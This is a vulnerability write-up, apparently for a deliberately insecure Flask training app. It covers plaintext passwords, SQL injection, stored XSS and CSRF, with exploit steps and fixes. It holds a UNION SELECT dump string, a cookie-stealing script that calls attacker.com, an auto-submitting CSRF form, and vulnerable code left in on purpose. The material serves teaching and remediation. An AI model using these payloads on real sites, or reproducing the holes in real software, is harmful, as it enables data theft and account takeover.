# Security Vulnerabilities in Vulnerable Web Application

## 1. Plaintext Password Storage

### Description

The application stores user passwords in plaintext within the database, which is a critical security vulnerability. If an attacker gains access to the database, they can immediately see and use all user passwords without needing to crack or decrypt them. This violates security best practices which require passwords to be stored using strong, salted hashing algorithms.

### Vulnerable Code Location

```python
class User(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(80), unique=True, nullable=False)
    password = db.Column(db.String(80), nullable=False)  # Vulnerable: Plaintext password
    email = db.Column(db.String(120), nullable=False)
    # Other fields...
```

### Exploitation

1. An attacker who gains access to the database can directly read all user passwords
2. SQL injection vulnerabilities elsewhere in the application could expose these passwords
3. Database dumps or backups would contain plaintext passwords

Evidence: In the admin dashboard, passwords are displayed in plaintext:

```python
@app.route('/admin/dashboard')
def admin_dashboard():
    # Check if user is admin
    current_user = ensure_user_object(get_current_user())
    if not current_user or not current_user.is_admin:
        return redirect('/login')

    # Get all users from the database
    users = User.query.all()
    user_data = []
    for user in users:
        user_data.append({
            'id': user.id,
            'username': user.username,
            'email': user.email,
            'password': user.password,  # Exposing plaintext password
            'full_name': user.full_name,
            'address': user.address,
            'phone': user.phone,
            'credit_card': user.credit_card,
            'ssn': user.ssn,
            'date_of_birth': user.date_of_birth,
            'is_admin': user.is_admin
        })

    return render_template('admin_dashboard.html', users=user_data, current_user=current_user)
```

### Remediation

Passwords should be hashed using a strong, modern algorithm with appropriate salting. The recommended approach is to use libraries like `bcrypt`, `Argon2`, or at minimum `PBKDF2` with a high iteration count.

### Fixed Code

```python
from werkzeug.security import generate_password_hash, check_password_hash

class User(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(80), unique=True, nullable=False)
    password_hash = db.Column(db.String(128), nullable=False)  # Store hash instead of plaintext
    email = db.Column(db.String(120), nullable=False)
    # Other fields...

    def set_password(self, password):
        self.password_hash = generate_password_hash(password)

    def check_password(self, password):
        return check_password_hash(self.password_hash, password)
```

The login route would need to be updated:

```python
@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')

        if not username or not password:
            error = "Username and password are required."
            return render_template('login.html', error=error)

        user = User.query.filter_by(username=username).first()

        if user and user.check_password(password):  # Use password checking method
            # Create response with redirect
            response = make_response(redirect('/'))
            # Set cookie with user info
            user_data = {'username': user.username, 'id': user.id}
            response.set_cookie('current_user', json.dumps(user_data))
            response.set_cookie('is_admin', str(user.is_admin).lower())
            return response
        else:
            error = "Invalid username or password."
            return render_template('login.html', error=error)

    return render_template('login.html')
```

The registration route would also need to be updated to use the password hashing method.

## 2. SQL Injection in Search Functionality

### Description

The application's search functionality is vulnerable to SQL injection attacks. The user input from the search query parameter is directly concatenated into the SQL query without proper sanitization or parameterization. This allows attackers to manipulate the query structure and potentially extract sensitive data, modify database content, or even gain unauthorized access to the system.

### Vulnerable Code Location

```python
@app.route('/search')
def search():
    # Vulnerable: XSS and SQL Injection
    current_user = ensure_user_object(get_current_user())
    if not current_user:
        return redirect('/login')

    query = request.args.get('q', '')

    if not query:
        return render_template('search.html',
                              results=[],
                              query='',
                              current_user=current_user)

    try:
        # Use direct SQLite3 connection instead of SQLAlchemy
        conn = sqlite3.connect(db_path)
        cursor = conn.cursor()

        # Vulnerable: Direct string formatting in SQL query
        sql_query = f"SELECT * FROM user WHERE username LIKE '%{query}%' OR full_name LIKE '%{query}%' OR email LIKE '%{query}%'"
        cursor.execute(sql_query)
        results = cursor.fetchall()

        # Get column names
        column_names = [description[0] for description in cursor.description]

        # Convert to list of dicts
        users = []
        for row in results:
            user_dict = {}
            for i, value in enumerate(row):
                user_dict[column_names[i]] = value
            users.append(user_dict)

        return render_template('search.html',
                              results=users,
                              query=query,
                              current_user=current_user)
    except Exception as e:
        # Make SQL errors visible for easier exploitation
        return str(e), 500
    finally:
        cursor.close()
        conn.close()
```

### Exploitation

1. An attacker can inject SQL code by manipulating the search query parameter
2. Example exploit URL: `/search?q=' UNION SELECT username,password,id,email,full_name,address,phone,credit_card,ssn,date_of_birth FROM user--`
3. This would return all user data including sensitive information like passwords, credit card numbers, and SSNs

Step-by-step exploitation:

1. Navigate to the search page
2. Enter the following in the search box: `' UNION SELECT username,password,id,email,full_name,address,phone,credit_card,ssn,date_of_birth FROM user--`
3. Submit the search
4. The application will display all user data, including sensitive information

The vulnerability is made worse by the fact that the application displays SQL errors to the user, making it easier for attackers to craft working exploits.

### Remediation

Use parameterized queries instead of string concatenation to prevent SQL injection attacks. This ensures that user input is treated as data, not executable code.

### Fixed Code

```python
@app.route('/search')
def search():
    current_user = ensure_user_object(get_current_user())
    if not current_user:
        return redirect('/login')

    query = request.args.get('q', '')

    if not query:
        return render_template('search.html',
                              results=[],
                              query='',
                              current_user=current_user)

    try:
        # Use direct SQLite3 connection instead of SQLAlchemy
        conn = sqlite3.connect(db_path)
        cursor = conn.cursor()

        # Fixed: Use parameterized query with placeholders
        search_pattern = f"%{query}%"  # Create the pattern outside the query
        sql_query = "SELECT * FROM user WHERE username LIKE ? OR full_name LIKE ? OR email LIKE ?"
        cursor.execute(sql_query, (search_pattern, search_pattern, search_pattern))
        results = cursor.fetchall()

        # Get column names
        column_names = [description[0] for description in cursor.description]

        # Convert to list of dicts
        users = []
        for row in results:
            user_dict = {}
            for i, value in enumerate(row):
                user_dict[column_names[i]] = value
            users.append(user_dict)

        return render_template('search.html',
                              results=users,
                              query=query,
                              current_user=current_user)
    except Exception as e:
        # Don't expose error details to users
        print(f"Search error: {str(e)}")  # Log the error instead
        return "An error occurred during search", 500
    finally:
        cursor.close()
        conn.close()
```

## 3. Cross-Site Scripting (XSS) in User Comments

### Description

The application is vulnerable to Cross-Site Scripting (XSS) attacks in the comment functionality. User input from comment forms is stored in the database and later displayed without proper sanitization or escaping. This allows attackers to inject malicious JavaScript code that will be executed in the browsers of other users who view the comments.

### Vulnerable Code Location

```python
@app.route('/post/<int:post_id>/comment', methods=['POST'])
def add_comment(post_id):
    if not is_logged_in():
        return redirect('/login')

    current_user = get_current_user()
    if not current_user:
        return redirect('/logout')

    # Get the comment content
    content = request.form['content']  # Vulnerable: XSS possible

    # Create new comment
    new_comment = Comment(
        user_id=current_user.id,
        post_id=post_id,
        content=content
    )

    db.session.add(new_comment)

    # Get the post
    post = Post.query.get(post_id)

    # Create notification for post author
    if post.user_id != current_user.id:
        notification = Notification(
            user_id=post.user_id,
            content=f"{current_user.username} commented on your post",
            notification_type="comment",
            related_id=post_id
        )
        db.session.add(notification)

    db.session.commit()

    # Vulnerable: No CSRF protection
    return redirect(f'/post/{post_id}')
```

In the view_post route, the comments are retrieved and passed to the template:

```python
@app.route('/post/<int:post_id>')
def view_post(post_id):
    # ... other code ...

    # Get comments
    comments = Comment.query.filter_by(post_id=post_id).order_by(Comment.timestamp.desc())

    return render_template('view_post.html',
                          post=post,
                          author=author,
                          comments=comments,
                          current_user=current_user,
                          has_liked=has_liked)
```

The template likely renders the comment content directly without escaping, allowing script execution.

### Exploitation

1. An attacker can post a comment containing malicious JavaScript code
2. Example payload: `<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>`
3. When other users view the post with this comment, the JavaScript will execute in their browsers

Step-by-step exploitation:

1. Navigate to a post
2. Add a comment with the following content: `<script>alert(document.cookie)</script>`
3. Submit the comment
4. When any user (including the attacker) views the post, they will see an alert box displaying their cookies

This vulnerability can be used to steal session cookies, perform actions on behalf of the victim, or redirect users to phishing sites.

### Remediation

To fix this vulnerability, the application should properly escape or sanitize user input before displaying it. This can be done using template engine escaping features or HTML sanitization libraries.

### Fixed Code

If using Flask with Jinja2 templates, ensure that the template uses the `{{ }}` syntax which automatically escapes HTML:

```html
<!-- In view_post.html template -->
{% for comment in comments %}
<div class="comment">
  <p>{{ comment.content }}</p>
  <!-- Content is automatically escaped -->
</div>
{% endfor %}
```

For additional protection, sanitize the input when it's received:

```python
from markupsafe import escape

@app.route('/post/<int:post_id>/comment', methods=['POST'])
def add_comment(post_id):
    if not is_logged_in():
        return redirect('/login')

    current_user = get_current_user()
    if not current_user:
        return redirect('/logout')

    # Get the comment content and sanitize it
    content = escape(request.form['content'])  # Sanitize input

    # Create new comment
    new_comment = Comment(
        user_id=current_user.id,
        post_id=post_id,
        content=content
    )

    db.session.add(new_comment)

    # Get the post
    post = Post.query.get(post_id)

    # Create notification for post author
    if post.user_id != current_user.id:
        notification = Notification(
            user_id=post.user_id,
            content=f"{current_user.username} commented on your post",
            notification_type="comment",
            related_id=post_id
        )
        db.session.add(notification)

    db.session.commit()

    # Vulnerable: No CSRF protection
    return redirect(f'/post/{post_id}')
```

Alternatively, you could use a library like bleach to allow certain HTML tags while stripping potentially dangerous ones:

```python
import bleach

@app.route('/post/<int:post_id>/comment', methods=['POST'])
def add_comment(post_id):
    # ... other code ...

    # Get the comment content and sanitize it
    content = request.form['content']
    allowed_tags = ['p', 'br', 'strong', 'em', 'u', 'a']
    allowed_attributes = {'a': ['href', 'title']}
    sanitized_content = bleach.clean(content, tags=allowed_tags, attributes=allowed_attributes)

    # Create new comment with sanitized content
    new_comment = Comment(
        user_id=current_user.id,
        post_id=post_id,
        content=sanitized_content
    )

    # ... rest of the code remains the same ...
```

## 4. Cross-Site Request Forgery (CSRF) in Password Change

### Description

The application is vulnerable to Cross-Site Request Forgery (CSRF) attacks in the password change functionality. The application does not implement any CSRF protection mechanisms such as anti-CSRF tokens, which allows attackers to trick users into submitting requests that change their passwords without their knowledge or consent.

### Vulnerable Code Location

```python
@app.route('/change-password', methods=['GET', 'POST'])
def change_password():
    current_user = ensure_user_object(get_current_user())
    if not current_user:
        return redirect('/login')

    error = None
    success = None

    if request.method == 'POST':
        current_password = request.form.get('current_password')
        new_password = request.form.get('new_password')
        confirm_password = request.form.get('confirm_password')

        # Vulnerable: No CSRF token validation

        # Check if current password is correct
        if current_password != current_user.password:
            error = "Current password is incorrect."
        elif new_password != confirm_password:
            error = "New passwords do not match."
        elif len(new_password) < 4:
            error = "Password must be at least 4 characters long."
        else:
            try:
                # Update the password
                current_user.password = new_password
                db.session.commit()
                success = "Password changed successfully."
                print(f"Password changed for user: {current_user.username}")
            except Exception as e:
                db.session.rollback()
                error = f"An error occurred: {str(e)}"
                print(f"Error changing password: {str(e)}")

    return render_template('change_password.html', error=error, success=success, current_user=current_user)
```

### Exploitation

1. An attacker creates a malicious website with a hidden form that submits to the vulnerable application's password change endpoint
2. When a victim who is authenticated to the vulnerable application visits the attacker's site, the form is automatically submitted
3. The victim's password is changed without their knowledge or consent

Step-by-step exploitation:

1. Create a malicious HTML page with the following content:

```html
<html>
  <body onload="document.getElementById('csrf-form').submit()">
    <form
      id="csrf-form"
      action="http://vulnerable-app.com/change-password"
      method="POST"
    >
      <input type="hidden" name="current_password" value="password123" />
      <input type="hidden" name="new_password" value="hacked123" />
      <input type="hidden" name="confirm_password" value="hacked123" />
    </form>
  </body>
</html>
```

2. Host this page on a server or send it directly to the victim
3. When the victim visits the page while being authenticated to the vulnerable application, their password will be changed to "hacked123"

Note: This attack assumes the attacker knows the victim's current password. However, in some cases, the application might have other vulnerabilities (like password reuse or predictable passwords) that make this attack feasible.

### Remediation

Implement CSRF protection by using anti-CSRF tokens. These tokens should be:

1. Unique per user session
2. Included in the form as a hidden field
3. Validated on the server side for each state-changing request

### Fixed Code

```python
from flask import Flask, request, render_template, redirect, session, jsonify, abort, make_response, Response, url_for, flash
import secrets  # For generating secure tokens

# Add a function to generate CSRF tokens
def generate_csrf_token():
    if 'csrf_token' not in session:
        session['csrf_token'] = secrets.token_hex(32)
    return session['csrf_token']

# Make the CSRF token available in all templates
app.jinja_env.globals['csrf_token'] = generate_csrf_token

@app.route('/change-password', methods=['GET', 'POST'])
def change_password():
    current_user = ensure_user_object(get_current_user())
    if not current_user:
        return redirect('/login')

    error = None
    success = None

    if request.method == 'POST':
        # Validate CSRF token
        token = request.form.get('csrf_token')
        if not token or token != session.get('csrf_token'):
            error = "Invalid request. Please try again."
            return render_template('change_password.html', error=error, success=success, current_user=current_user)

        current_password = request.form.get('current_password')
        new_password = request.form.get('new_password')
        confirm_password = request.form.get('confirm_password')

        # Check if current password is correct
        if current_password != current_user.password:
            error = "Current password is incorrect."
        elif new_password != confirm_password:
            error = "New passwords do not match."
        elif len(new_password) < 4:
            error = "Password must be at least 4 characters long."
        else:
            try:
                # Update the password
                current_user.password = new_password
                db.session.commit()
                success = "Password changed successfully."
                print(f"Password changed for user: {current_user.username}")
            except Exception as e:
                db.session.rollback()
                error = f"An error occurred: {str(e)}"
                print(f"Error changing password: {str(e)}")

    return render_template('change_password.html', error=error, success=success, current_user=current_user)
```

The template should include the CSRF token in the form:

```html
<!-- In change_password.html template -->
<form method="POST" action="/change-password">
  <input type="hidden" name="csrf_token" value="{{ csrf_token() }}" />
  <!-- Other form fields -->
</form>
```
